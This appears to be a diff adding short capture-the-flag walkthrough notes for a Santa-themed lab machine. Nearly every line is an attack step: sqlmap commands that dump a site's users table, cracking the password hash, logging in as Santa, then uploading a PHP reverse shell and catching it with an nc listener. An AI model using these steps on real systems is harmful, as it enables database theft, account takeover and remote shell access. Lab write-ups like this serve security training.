@@ -1,0 +1,12 @@
+sqlmap http://10.10.164.103/register.php --forms --crawl=2 --dump
+sqlmap http://10.10.164.103/register.php --forms --crawl=2 --tables -D social
+sqlmap http://10.10.164.103/register.php --forms --crawl=2 --tables -D social -T users --column --batch
+sqlmap http://10.10.164.103/register.php --forms --crawl=2 --tables -D social -T users -C username,email,password --batch --dump
+the email that is dumped is santa's email
+crack the hash, that is santa's password
+log into the site as santa, go to messages (top right the letter symbol) and you will see which station they are meeting
+create a the file shell.phtml with the contents found here, https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+edit the IP to your local ip and upload the file,
+nc -lvnp 1234
+go to /assets/images/posts and click on it
+you have a shell open the file
